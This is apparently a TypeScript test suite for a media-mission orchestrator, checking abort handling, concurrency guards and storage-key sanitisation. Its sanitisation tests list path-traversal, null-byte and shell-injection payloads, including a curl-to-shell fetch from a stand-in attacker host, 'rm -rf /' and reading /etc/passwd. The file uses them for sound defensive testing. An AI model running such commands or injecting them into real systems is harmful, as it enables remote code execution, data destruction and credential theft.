/**
 * Multi-Track Tier 5 Orchestrator White-Box Adversarial Stress Test Suite.
 *
 * Implements Tier 5 White-Box Adversarial Hardening:
 * 1. Concurrency & Abort Cascading:
 *    - Sibling track cancellation: Track 2 (audio) throws -> Track 3 (visual) AbortSignal cleanly cancels without dangling promises or uncaught background exceptions.
 *    - Sibling track cancellation: Track 3 (visual) throws -> Track 2 (audio) AbortSignal cleanly cancels.
 *    - Simultaneous sibling track failures: both audio and visual throw concurrently without unhandled rejections.
 *    - Mid-flight AbortController cancellation cascading while both parallel tracks are active.
 *    - Mid-flight AbortController cancellation when one track already completed and sibling is in flight.
 *    - Idempotency & multiple abort triggers.
 * 2. Optimistic Concurrency Control (OCC CAS) & State Locking:
 *    - Simulated out-of-band status mutation racing with saveCheckpoint.
 *    - Simultaneous checkpoint writes from concurrent sub-tracks.
 *    - Fail-closed handling when mission status is modified concurrently (changes === 0).
 *    - Guard against mutations on terminal states ('completed', 'failed', 'cancelled').
 * 3. R2 Key Sanitation & Path Traversal Safety:
 *    - Path traversal attacks (../../, win32 backslashes, mixed slashes).
 *    - Null byte injection attacks (\0, %00).
 *    - Shell metacharacters & command injection payloads (; rm -rf, $(whoami), |, >).
 *    - Unicode normalization, confusable homoglyphs, and RTL overrides.
 *    - Extreme boundary inputs (empty, pure symbols, long strings for ReDoS resilience).
 * 4. 7-Gate Preflight Boundary & Fail-Closed Gates:
 *    - Dynamically missing multi-track capabilities (e.g. AI_VIDEO or AI_AUDIO missing).
 *    - Insufficient MCU balance and tier entitlement boundary conditions.
 *    - Cost spike limit exceeded (> 500 cents).
 *    - Unverified workspace membership (IDOR protection).
 *    - Unauthenticated execution requests.
 * 5. Land Server Action Hardening (`executeMultiTrackMissionAction`):
 *    - Fail-closed Result pattern (zero thrown exceptions across action boundaries).
 *    - IDOR workspace authorization and role validation.
 *    - Preflight failure propagation.
 *
 * Architecture Compliance:
 * - Zero `:any` types.
 * - Strict 4-layer import hierarchy (seed -> tree -> forest -> land).
 *
 * @module __tests__/e2e/multi-track-tier5-orchestrator-adversarial.test
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { createRequire } from 'node:module';
import { posix } from 'node:path';

// ── In-Memory SQLite Shim ───────────────────────────────────────────────────
const req = createRequire(import.meta.url);
const { DatabaseSync } = req('node:sqlite') as {
  DatabaseSync: new (path: string) => {
    exec(sql: string): void;
    prepare(sql: string): {
      get(...params: unknown[]): unknown;
      all(...params: unknown[]): unknown[];
      run(...params: unknown[]): { lastInsertRowid: bigint; changes: number };
    };
  };
};

type StatementSync = ReturnType<InstanceType<typeof DatabaseSync>['prepare']>;

function makeD1(db: InstanceType<typeof DatabaseSync>) {
  return {
    prepare(sql: string) {
      const stmt: StatementSync = db.prepare(sql);
      return {
        bind: (...params: unknown[]) => {
          const sanitized = params.map((p) => (p === undefined ? null : p));
          return {
            first: async <T = Record<string, unknown>>() =>
              stmt.get(...sanitized) as T | undefined,
            run: async () => {
              const r = stmt.run(...sanitized);
              return { success: true, meta: { changes: Number(r.changes ?? 0), duration: 0 } };
            },
            all: async <T = Record<string, unknown>>() => {
              return { results: stmt.all(...sanitized) as T[], meta: { changes: 0, duration: 0 } };
            },
          };
        },
        first: async <T = Record<string, unknown>>() =>
          stmt.get() as T | undefined,
        run: async () => {
          const r = stmt.run();
          return { success: true, meta: { changes: Number(r.changes ?? 0), duration: 0 } };
        },
        all: async <T = Record<string, unknown>>() => {
          return { results: stmt.all() as T[], meta: { changes: 0, duration: 0 } };
        },
      };
    },
    exec: (sql: string) => db.exec(sql),
  };
}

const ADVERSARIAL_SCHEMA = `
CREATE TABLE IF NOT EXISTS creative_missions (
  id TEXT PRIMARY KEY,
  workspace_id TEXT NOT NULL,
  creator_id TEXT NOT NULL,
  brand_id TEXT,
  title TEXT NOT NULL,
  objective TEXT NOT NULL DEFAULT '',
  audience TEXT NOT NULL DEFAULT '',
  geography TEXT NOT NULL DEFAULT 'global',
  timeframe_start INTEGER NOT NULL DEFAULT 0,
  timeframe_end INTEGER NOT NULL DEFAULT 0,
  budget_cents INTEGER NOT NULL DEFAULT 0,
  spent_cents INTEGER NOT NULL DEFAULT 0,
  autonomy_level INTEGER NOT NULL DEFAULT 0,
  channels TEXT NOT NULL DEFAULT '[]',
  monetization_goals TEXT NOT NULL DEFAULT '[]',
  constraints TEXT NOT NULL DEFAULT '{}',
  success_metrics TEXT NOT NULL DEFAULT '{}',
  status TEXT NOT NULL DEFAULT 'draft',
  current_phase TEXT NOT NULL DEFAULT 'init',
  created_at INTEGER NOT NULL DEFAULT 0,
  updated_at INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS content_assets (
  id TEXT PRIMARY KEY,
  project_id TEXT NOT NULL,
  workspace_id TEXT NOT NULL,
  type TEXT NOT NULL,
  storage_key TEXT,
  mime_type TEXT,
  size_bytes INTEGER,
  duration_seconds INTEGER,
  status TEXT NOT NULL DEFAULT 'draft',
  metadata TEXT NOT NULL DEFAULT '{}',
  created_at INTEGER NOT NULL DEFAULT 0,
  updated_at INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS org_members (
  id TEXT PRIMARY KEY,
  org_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  role TEXT NOT NULL DEFAULT 'OWNER',
  created_at INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS user_api_keys (
  user_id TEXT NOT NULL,
  provider TEXT NOT NULL,
  encrypted_key BLOB NOT NULL,
  key_version INTEGER,
  key_validated_at INTEGER,
  updated_at TEXT,
  PRIMARY KEY (user_id, provider)
);

CREATE TABLE IF NOT EXISTS key_versions (
  key_type TEXT,
  version INTEGER PRIMARY KEY,
  encrypted_key TEXT,
  rotated_at TEXT,
  is_active INTEGER DEFAULT 1
);
`;

let memDb: InstanceType<typeof DatabaseSync>;
let activeD1: ReturnType<typeof makeD1>;

vi.mock('@/seed/db/client', () => ({
  getD1: vi.fn(async () => activeD1),
  createServerClient: vi.fn(() => ({
    prepare: (sql: string) => activeD1.prepare(sql),
    from: vi.fn(() => ({
      select: vi.fn(() => ({
        eq: vi.fn(() => ({
          single: vi.fn(async () => ({ data: { credits_remaining: 100 }, error: null })),
        })),
      })),
    })),
  })),
}));

const mockCurrentUser = {
  id: 'usr_adversary_test',
  name: 'Adversarial Tester',
  email: 'tester@sophia.local',
};

vi.mock('@/seed/auth/better-auth-session', () => ({
  getCurrentUser: vi.fn(async () => mockCurrentUser),
}));

vi.mock('@/seed/inngest/client', () => ({
  inngest: {
    send: vi.fn(async () => ({ ids: ['msg_test_001'] })),
  },
}));

// ── Domain Imports ──────────────────────────────────────────────────────────
import {
  executeMultiTrackMission,
  getMissionTrackStatus,
  formatTenantAssetKey,
  parseScriptIntoScenes,
  saveCheckpoint,
  assertMissionActive,
  transitionStatusCAS,
  clearTrackStatusCache,
  getCachedTrackStatus,
  type MissionTrackStatus,
} from '@/forest/mission/multi-track-orchestrator';
import type { MultiTrackProviders } from '@/forest/ai/provider-factory';
import type { Provider, ChatMessage, ChatOptions, ChatResponse } from '@/seed/ai/provider-interface';
import type {
  IAudioProvider,
  AudioGenerationInput,
  AudioGenerationResult,
  ImageGenerationProvider,
  ImageGenerationInput,
  ImageGenerationResult,
  IVideoRenderingProvider,
  VideoRenderInput,
  VideoRenderStatus,
} from '@/seed/ai/multimodal-provider-interface';
import {
  runMissionPreflightCheck,
  MAX_SINGLE_MISSION_COST_CENTS,
} from '@/tree/mission/preflight-check';
import {
  resolveCapabilities,
  hasRequiredCapabilities,
  type AICapability,
} from '@/seed/ai/capability-model';
import {
  setUserApiKey,
  clearUserApiKey,
} from '@/tree/byok/user-api-key-store';
import {
  createMission,
  updateMissionStatus,
  getMission,
} from '@/tree/mission/repository';
import {
  canTransition,
  canStartExecution,
  MissionError,
  newMissionId,
} from '@/tree/mission/types';
import {
  executeMultiTrackMissionAction,
} from '@/land/creative-mission/actions';

// Standard 32-byte test master key in base64
const TEST_MASTER_KEY = 'QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=';

// ── Provider Mock Factory ───────────────────────────────────────────────────
function buildControllableProviders(hooks?: {
  onScriptChat?: (msgs: ChatMessage[], opts: ChatOptions) => Promise<ChatResponse> | ChatResponse;
  onGenerateSpeech?: (input: AudioGenerationInput, creatorId?: string) => Promise<AudioGenerationResult>;
  onGenerateImage?: (input: ImageGenerationInput) => Promise<ImageGenerationResult>;
  onRenderVideo?: (input: VideoRenderInput, creatorId?: string) => Promise<{ jobId: string }>;
}): MultiTrackProviders {
  const scriptProvider: Provider = {
    id: 'openrouter',
    label: 'Adversarial Script Provider',
    chat: vi.fn(async (msgs: ChatMessage[], opts: ChatOptions): Promise<ChatResponse> => {
      if (hooks?.onScriptChat) {
        return hooks.onScriptChat(msgs, opts);
      }
      return {
        content: JSON.stringify({
          title: 'Adversarial Stress Video',
          narration: 'Narration describing adversarial failure modes.',
          scenes: [
            { index: 1, prompt: 'Visual prompt scene 1', narration: 'Narration scene 1' },
            { index: 2, prompt: 'Visual prompt scene 2', narration: 'Narration scene 2' },
          ],
        }),
        model: 'openrouter/auto',
        provider: 'openrouter',
        usage: { inputTokens: 40, outputTokens: 80 },
        stopReason: 'end_turn',
        latencyMs: 50,
      };
    }),
    stream: vi.fn(),
    countTokens: vi.fn(() => 40),
    estimateCost: vi.fn(() => 0.001),
    getCapabilities: vi.fn(() => ({
      streaming: false,
      systemRole: true,
      maxOutputTokens: 2048,
      maxInputTokens: 4096,
      functionCalling: false,
      vision: false,
    })),
  };

  const audioProvider: IAudioProvider = {
    id: 'elevenlabs',
    label: 'Adversarial Audio Provider',
    generateSpeech: vi.fn(async (input: AudioGenerationInput, creatorId?: string): Promise<AudioGenerationResult> => {
      if (hooks?.onGenerateSpeech) {
        return hooks.onGenerateSpeech(input, creatorId);
      }
      return {
        audioBuffer: new ArrayBuffer(512),
        durationSeconds: 15,
        mimeType: 'audio/mpeg',
        provider: 'elevenlabs',
        latencyMs: 100,
        audioUrl: 'https://vault.test/audio.mp3',
      };
    }),
  };

  const imageProvider: ImageGenerationProvider = {
    id: 'fal-ai',
    label: 'Adversarial Image Provider',
    capabilities: () => ({ supportsAspectRatio: true, supportsStyle: true, maxConcurrency: 4 }),
    health: async () => ({ healthy: true }),
    generate: vi.fn(async (input: ImageGenerationInput): Promise<ImageGenerationResult> => {
      if (hooks?.onGenerateImage) {
        return hooks.onGenerateImage(input);
      }
      return {
        assetRef: 'https://vault.test/image.png',
        provider: 'fal-ai',
        latencyMs: 100,
        requestedAt: Math.floor(Date.now() / 1000),
        costCents: 1,
        costClassification: 'METERED',
      };
    }),
  };

  const videoProvider: IVideoRenderingProvider = {
    id: 'replicate',
    label: 'Adversarial Video Provider',
    renderVideo: vi.fn(async (input: VideoRenderInput, creatorId?: string): Promise<{ jobId: string }> => {
      if (hooks?.onRenderVideo) {
        return hooks.onRenderVideo(input, creatorId);
      }
      return { jobId: 'job_adversarial_vid_1' };
    }),
    checkStatus: vi.fn(async (): Promise<VideoRenderStatus> => ({
      status: 'completed',
      videoUrl: 'https://vault.test/final.mp4',
    })),
    health: async () => ({ healthy: true }),
  };

  return { scriptProvider, audioProvider, imageProvider, videoProvider };
}

describe('Multi-Track Tier 5 Orchestrator White-Box Adversarial Stress Test Suite', () => {
  beforeEach(() => {
    process.env.BYOK_MASTER_KEY = TEST_MASTER_KEY;
    memDb = new DatabaseSync(':memory:');
    memDb.exec(ADVERSARIAL_SCHEMA);
    activeD1 = makeD1(memDb);
    clearTrackStatusCache();
  });

  afterEach(() => {
    vi.clearAllMocks();
    clearTrackStatusCache();
    delete process.env.BYOK_MASTER_KEY;
  });

  // ==========================================================================
  // SECTION 1: CONCURRENCY & ABORT CASCADING STRESS TESTING
  // ==========================================================================
  describe('1. Concurrency & Abort Cascading Stress Testing', () => {
    it('ADV-1.1: Audio failure cascades AbortSignal to active Visual track without leaking promises', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_concurrency_test';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'Audio Crash Mission', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const providers = buildControllableProviders({
        onGenerateSpeech: async () => {
          // Audio fails fast (simulate provider network crash)
          await new Promise((resolve) => setTimeout(resolve, 10));
          throw new Error('ElevenLabs 503 Service Unavailable: upstream connection reset');
        },
        onGenerateImage: async () => {
          // Visual takes 80ms
          await new Promise((resolve) => setTimeout(resolve, 80));
          return {
            assetRef: 'https://vault.test/delayed.png',
            provider: 'fal-ai',
            latencyMs: 80,
            requestedAt: Math.floor(Date.now() / 1000),
            costCents: 1,
            costClassification: 'METERED',
          };
        },
      });

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('failed');
      expect(res.trackStatus.script).toBe('completed');
      expect(res.trackStatus.audio).toBe('failed');
      expect(res.trackStatus.visual).toBe('cancelled');
      expect(res.trackStatus.video).toBe('pending');
      expect(res.error).toContain('ElevenLabs 503 Service Unavailable');

      // Allow extra time to ensure dangling promises do not overwrite DB state
      await new Promise((resolve) => setTimeout(resolve, 100));

      const finalRow = await activeD1
        .prepare('SELECT status, current_phase FROM creative_missions WHERE id = ?')
        .bind(missionId)
        .first<{ status: string; current_phase: string }>();

      expect(finalRow?.status).toBe('failed');
      expect(finalRow?.current_phase).toBe('failed');
      expect(providers.videoProvider.renderVideo).not.toHaveBeenCalled();
    });

    it('ADV-1.2: Visual failure cascades AbortSignal to active Audio track and marks audio cancelled', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_concurrency_test';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'Visual Crash Mission', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const providers = buildControllableProviders({
        onGenerateSpeech: async () => {
          // Audio takes 100ms
          await new Promise((resolve) => setTimeout(resolve, 100));
          return {
            audioBuffer: new ArrayBuffer(256),
            durationSeconds: 12,
            mimeType: 'audio/mpeg',
            provider: 'elevenlabs',
            latencyMs: 100,
            audioUrl: 'https://vault.test/slow-audio.mp3',
          };
        },
        onGenerateImage: async () => {
          // Visual throws immediately
          await new Promise((resolve) => setTimeout(resolve, 10));
          throw new Error('fal.ai 429 Quota Exceeded: concurrency limit reached');
        },
      });

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('failed');
      expect(res.trackStatus.script).toBe('completed');
      expect(res.trackStatus.visual).toBe('failed');
      expect(res.trackStatus.audio).toBe('cancelled');
      expect(res.trackStatus.video).toBe('pending');
      expect(res.error).toContain('fal.ai 429 Quota Exceeded');
      expect(providers.videoProvider.renderVideo).not.toHaveBeenCalled();
    });

    it('ADV-1.3: Simultaneous sibling failures (both audio & visual throw concurrently) settle cleanly without uncaught errors', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_concurrency_test';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'Double Crash Mission', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const providers = buildControllableProviders({
        onGenerateSpeech: async () => {
          await new Promise((resolve) => setTimeout(resolve, 5));
          throw new Error('Audio Crash A');
        },
        onGenerateImage: async () => {
          await new Promise((resolve) => setTimeout(resolve, 5));
          throw new Error('Visual Crash B');
        },
      });

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('failed');
      // At least one is failed, the other is failed or cancelled depending on race
      expect(['failed', 'cancelled']).toContain(res.trackStatus.audio);
      expect(['failed', 'cancelled']).toContain(res.trackStatus.visual);
      expect(res.trackStatus.video).toBe('pending');
      expect(providers.videoProvider.renderVideo).not.toHaveBeenCalled();
    });

    it('ADV-1.4: External AbortController signal mid-flight aborts both active parallel tracks and transitions to cancelled', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_abort_signal_test';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'External Abort Mission', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const abortController = new AbortController();

      const providers = buildControllableProviders({
        onGenerateSpeech: async () => {
          // Trigger external abort while audio is generating
          await new Promise((resolve) => setTimeout(resolve, 20));
          abortController.abort(new Error('User clicked cancel mid-flight'));
          await new Promise((resolve) => setTimeout(resolve, 50));
          return {
            audioBuffer: new ArrayBuffer(128),
            durationSeconds: 10,
            mimeType: 'audio/mpeg',
            provider: 'elevenlabs',
            latencyMs: 70,
            audioUrl: 'https://vault.test/audio.mp3',
          };
        },
        onGenerateImage: async () => {
          // Visual takes 80ms so it is also in-flight when abort is triggered at 20ms
          await new Promise((resolve) => setTimeout(resolve, 80));
          return {
            assetRef: 'https://vault.test/frame.png',
            provider: 'fal-ai',
            latencyMs: 80,
            requestedAt: Math.floor(Date.now() / 1000),
            costCents: 1,
            costClassification: 'METERED',
          };
        },
      });

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
        signal: abortController.signal,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('cancelled');
      expect(res.currentPhase).toBe('cancelled');
      expect(res.trackStatus.audio).toBe('cancelled');
      expect(res.trackStatus.visual).toBe('cancelled');
      expect(res.trackStatus.video).toBe('pending');
      expect(providers.videoProvider.renderVideo).not.toHaveBeenCalled();

      const row = await activeD1
        .prepare('SELECT status, current_phase FROM creative_missions WHERE id = ?')
        .bind(missionId)
        .first<{ status: string; current_phase: string }>();

      expect(row?.status).toBe('cancelled');
      expect(row?.current_phase).toBe('cancelled');
    });

    it('ADV-1.5: Abort signal idempotency — multiple redundant abort calls do not throw or corrupt state', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_abort_idempotency';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'Redundant Abort Mission', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const abortController = new AbortController();
      // Pre-aborted signal with redundant calls
      abortController.abort('First abort call');
      abortController.abort('Second duplicate abort call');
      abortController.abort('Third redundant abort call');

      const providers = buildControllableProviders();

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
        signal: abortController.signal,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('cancelled');
      expect(res.trackStatus.audio).toBe('pending'); // Pre-aborted before parallel stage
      expect(res.trackStatus.visual).toBe('pending');
      expect(providers.audioProvider.generateSpeech).not.toHaveBeenCalled();
      expect(providers.imageProvider.generate).not.toHaveBeenCalled();
    });

    it('ADV-1.6: Mid-flight abort preserves completed sibling track when abort occurs after it finished', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_abort_completed_sibling';
      const creatorId = mockCurrentUser.id;

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, ?, ?, 'Partial Completed Sibling Abort', 'running', 'executing')`
        )
        .bind(missionId, workspaceId, creatorId)
        .run();

      const abortController = new AbortController();

      const providers = buildControllableProviders({
        onGenerateImage: async () => {
          // Visual finishes very fast (10ms)
          await new Promise((resolve) => setTimeout(resolve, 10));
          return {
            assetRef: 'https://vault.test/fast-visual.png',
            provider: 'fal-ai',
            latencyMs: 10,
            requestedAt: Math.floor(Date.now() / 1000),
            costCents: 1,
            costClassification: 'METERED',
          };
        },
        onGenerateSpeech: async () => {
          // Audio takes longer (60ms), and abort triggers at 30ms (after visual completed)
          await new Promise((resolve) => setTimeout(resolve, 30));
          abortController.abort(new Error('User aborted after visual completed'));
          await new Promise((resolve) => setTimeout(resolve, 30));
          return {
            audioBuffer: new ArrayBuffer(128),
            durationSeconds: 10,
            mimeType: 'audio/mpeg',
            provider: 'elevenlabs',
            latencyMs: 60,
            audioUrl: 'https://vault.test/audio.mp3',
          };
        },
      });

      const res = await executeMultiTrackMission(missionId, {
        userId: creatorId,
        workspaceId,
        providers,
        signal: abortController.signal,
      });

      expect(res.success).toBe(false);
      expect(res.status).toBe('cancelled');
      // Visual finished before abort fired -> preserved as completed!
      expect(res.trackStatus.visual).toBe('completed');
      // Audio was still running when abort fired -> marked cancelled!
      expect(res.trackStatus.audio).toBe('cancelled');
      expect(res.trackStatus.video).toBe('pending');
      expect(providers.videoProvider.renderVideo).not.toHaveBeenCalled();
    });
  });

  // ==========================================================================
  // SECTION 2: CAS OPTIMISTIC CONCURRENCY CONTROL (OCC) & STATE LOCKING
  // ==========================================================================
  describe('2. CAS Optimistic Concurrency Control (OCC) & State Locking', () => {
    it('ADV-2.1: saveCheckpoint fails closed with CONCURRENT_MODIFICATION when DB status changes out of band', async () => {
      const missionId = newMissionId();
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, 'ws_cas_1', 'usr_1', 'CAS Race Mission', 'running', 'executing')`
        )
        .bind(missionId)
        .run();

      // Simulate external actor pausing or cancelling mission in D1
      await activeD1
        .prepare("UPDATE creative_missions SET status = 'paused' WHERE id = ?")
        .bind(missionId)
        .run();

      const testStatus: MissionTrackStatus = {
        script: 'completed',
        audio: 'running',
        visual: 'running',
        video: 'pending',
      };

      await expect(
        saveCheckpoint(missionId, testStatus, 'voice_and_visuals')
      ).rejects.toMatchObject({
        code: 'CONCURRENT_MODIFICATION',
      });

      // Verify phase was NOT updated
      const row = await activeD1
        .prepare('SELECT status, current_phase FROM creative_missions WHERE id = ?')
        .bind(missionId)
        .first<{ status: string; current_phase: string }>();

      expect(row?.status).toBe('paused');
      expect(row?.current_phase).toBe('executing');
    });

    it('ADV-2.2: transitionStatusCAS fails closed with CONCURRENT_MODIFICATION when expectedStatus does not match', async () => {
      const missionId = newMissionId();
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, 'ws_cas_2', 'usr_1', 'CAS Transition Mission', 'running', 'executing')`
        )
        .bind(missionId)
        .run();

      // Expecting 'draft', but database is 'running'
      await expect(
        transitionStatusCAS(missionId, 'draft', 'running', 'executing')
      ).rejects.toMatchObject({
        code: 'CONCURRENT_MODIFICATION',
      });
    });

    it('ADV-2.3: Simultaneous saveCheckpoint writes from parallel tracks maintain consistent JSON constraints', async () => {
      const missionId = newMissionId();
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status, current_phase)
           VALUES (?, 'ws_cas_3', 'usr_1', 'Simultaneous Writes Mission', 'running', 'voice_and_visuals')`
        )
        .bind(missionId)
        .run();

      const statusAudioDone: MissionTrackStatus = {
        script: 'completed',
        audio: 'completed',
        visual: 'running',
        video: 'pending',
      };

      const statusVisualDone: MissionTrackStatus = {
        script: 'completed',
        audio: 'completed',
        visual: 'completed',
        video: 'pending',
      };

      // Concurrent invocation of saveCheckpoint
      await Promise.all([
        saveCheckpoint(missionId, statusAudioDone, 'voice_and_visuals'),
        saveCheckpoint(missionId, statusVisualDone, 'voice_and_visuals'),
      ]);

      const row = await activeD1
        .prepare('SELECT constraints FROM creative_missions WHERE id = ?')
        .bind(missionId)
        .first<{ constraints: string }>();

      const parsed = JSON.parse(row?.constraints || '{}') as { track_status?: MissionTrackStatus };
      expect(parsed.track_status).toBeDefined();
      expect(parsed.track_status?.script).toBe('completed');
      expect(parsed.track_status?.audio).toBe('completed');
    });

    it('ADV-2.4: assertMissionActive throws MISSION_CANCELLED immediately if mission status is cancelled', async () => {
      const missionId = newMissionId();
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status)
           VALUES (?, 'ws_cas_4', 'usr_1', 'Cancelled Mission', 'cancelled')`
        )
        .bind(missionId)
        .run();

      await expect(assertMissionActive(missionId)).rejects.toMatchObject({
        code: 'MISSION_CANCELLED',
      });
    });

    it('ADV-2.5: assertMissionActive throws INVALID_STATE if mission status is not running (e.g. paused)', async () => {
      const missionId = newMissionId();
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status)
           VALUES (?, 'ws_cas_5', 'usr_1', 'Paused Mission', 'paused')`
        )
        .bind(missionId)
        .run();

      await expect(assertMissionActive(missionId)).rejects.toMatchObject({
        code: 'INVALID_STATE',
      });
    });
  });

  // ==========================================================================
  // SECTION 3: R2 KEY SANITATION & PATH SAFETY (ADVERSARIAL ATTACKS)
  // ==========================================================================
  describe('3. R2 Key Sanitation & Path Safety', () => {
    it('ADV-3.1: Directory traversal sequences (../../) in tenantId, missionId, and trackType are whitelisted and cannot escape tenants/', () => {
      const traversalAttacks = [
        { tenant: '../../root', mission: 'msn_1', track: 'audio', asset: 'ast_1', ext: 'mp3' },
        { tenant: 'ws_tenant', mission: '../../../../etc', track: 'visual', asset: 'ast_2', ext: 'png' },
        { tenant: 'ws_tenant', mission: 'msn_2', track: '../../../../var/log', asset: 'ast_3', ext: 'json' },
        { tenant: '..\\..\\win32', mission: '..\\sys', track: 'video', asset: 'ast_4', ext: 'mp4' },
      ];

      for (const attack of traversalAttacks) {
        const key = formatTenantAssetKey(
          attack.tenant,
          attack.mission,
          attack.track,
          attack.asset,
          attack.ext
        );

        expect(key).not.toContain('..');
        expect(key).not.toContain('\\');
        expect(key.startsWith('tenants/')).toBe(true);
        expect(posix.normalize(key)).toBe(key);
      }
    });

    it('ADV-3.2: Null byte injections (\\0, %00) in all parameters are completely sanitized without truncating key', () => {
      const nullByteAttacks = [
        { tenant: 'tenant\0admin', mission: 'msn_100', track: 'audio', asset: 'ast_001', ext: 'mp3' },
        { tenant: 'tenant_1', mission: 'msn_100\0root', track: 'audio', asset: 'ast_001', ext: 'mp3' },
        { tenant: 'tenant_1', mission: 'msn_100', track: 'track\0evil', asset: 'ast_001', ext: 'mp3' },
        { tenant: 'tenant_1', mission: 'msn_100', track: 'audio', asset: 'ast_001\0secret', ext: 'mp3' },
        { tenant: 'tenant_1', mission: 'msn_100', track: 'audio', asset: 'ast_001', ext: 'mp3\0.exe' },
      ];

      for (const attack of nullByteAttacks) {
        const key = formatTenantAssetKey(
          attack.tenant,
          attack.mission,
          attack.track,
          attack.asset,
          attack.ext
        );

        expect(key).not.toContain('\0');
        expect(key).not.toContain('%00');
        expect(key.startsWith('tenants/')).toBe(true);
        expect(key).not.toContain('.exe');
      }
    });

    it('ADV-3.3: Shell metacharacters and command injection payloads are stripped cleanly to safe alphanumeric characters', () => {
      const shellPayloads = [
        'tenant; rm -rf /;',
        '`whoami`',
        '$(curl http://evil.attacker/shell.sh | sh)',
        'tenant | cat /etc/passwd',
        'tenant > /dev/null 2>&1 &',
        'asset && echo pwned',
      ];

      for (const payload of shellPayloads) {
        const key = formatTenantAssetKey(payload, 'msn_clean', payload, payload, 'mp4');
        expect(key).not.toContain(';');
        expect(key).not.toContain('`');
        expect(key).not.toContain('$');
        expect(key).not.toContain('|');
        expect(key).not.toContain('&');
        expect(key).not.toContain('>');
        expect(key).not.toContain(' ');
        expect(key.startsWith('tenants/')).toBe(true);
      }
    });

    it('ADV-3.4: Unicode normalization attacks (fullwidth dots \uFF0E, RTL overrides \u202E, Cyrillic homoglyphs) are sanitized', () => {
      const unicodeAttacks = [
        '\uFF0E\uFF0E/\uFF0E\uFF0E/evil_tenant', // Fullwidth dots
        'tenant\u202Ereversed\u202D',            // Right-to-Left Override
        '\u0430\u0434\u043C\u0438\u043D',        // Cyrillic 'admin'
        'tenant\u200Bzero\u200Bwidth',           // Zero-width spaces
        '🚀🔥✨_tenant',                           // Emoji payloads
      ];

      for (const attack of unicodeAttacks) {
        const key = formatTenantAssetKey(attack, 'msn_safe', 'audio', 'ast_safe', 'mp3');
        // Non-ASCII must be stripped completely
        expect(key).not.toContain('\uFF0E');
        expect(key).not.toContain('\u202E');
        expect(key).not.toContain('\u0430');
        expect(key).not.toContain('\u200B');
        expect(key).not.toContain('🚀');
        expect(key.startsWith('tenants/')).toBe(true);
      }
    });

    it('ADV-3.5: Empty, pure punctuation, and extreme boundary strings fall back to safe canonical tokens', () => {
      const boundaryCases = [
        { tenant: '', mission: '', track: '', asset: '', ext: '' },
        { tenant: '   ', mission: '   ', track: '   ', asset: '   ', ext: '   ' },
        { tenant: '///', mission: '...', track: '***', asset: '$$$', ext: '???' },
      ];

      for (const b of boundaryCases) {
        const key = formatTenantAssetKey(b.tenant, b.mission, b.track, b.asset, b.ext);
        expect(key).toBe('tenants/tenant/missions/mission/assets/track_asset.bin');
        expect(key.startsWith('tenants/tenant/')).toBe(true);
      }
    });

    it('ADV-3.6: ReDoS stress test — 10,000 characters of malicious repeated patterns sanitize instantaneously (<10ms)', () => {
      const giantInput = '../'.repeat(3000) + '!@#$%^&*()'.repeat(1000);
      const startTime = performance.now();
      const key = formatTenantAssetKey(giantInput, 'msn_redos', 'audio', 'ast_redos', 'mp3');
      const elapsed = performance.now() - startTime;

      expect(elapsed).toBeLessThan(50); // Must be fast without catastrophic backtracking
      expect(key.startsWith('tenants/')).toBe(true);
      expect(key).not.toContain('..');
    });
  });

  // ==========================================================================
